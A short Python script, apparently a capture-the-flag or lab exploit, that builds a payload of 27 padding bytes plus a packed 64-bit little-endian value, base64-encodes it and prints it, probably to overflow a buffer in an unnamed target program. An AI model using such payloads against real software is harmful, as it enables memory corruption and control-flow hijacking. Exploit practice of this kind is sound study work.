
import sys
import struct
import base64

buf = b'FFFFFFFFFFFFFFFFFFFFFFFFFFF'
buf += struct.pack('<Q', 9091097731788257202)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
